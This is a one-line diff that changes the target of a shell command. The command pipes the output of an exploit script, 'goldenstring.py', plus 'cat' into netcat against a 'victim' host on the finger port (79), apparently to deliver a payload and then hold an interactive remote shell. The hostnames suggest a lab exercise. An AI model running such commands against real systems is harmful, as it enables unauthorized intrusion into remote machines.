@@ -1,3 +1,3 @@
-(python3 goldenstring.py 4167 && cat) | nc victim29 79
+(python3 goldenstring.py && cat) | nc victim31 79
 
 
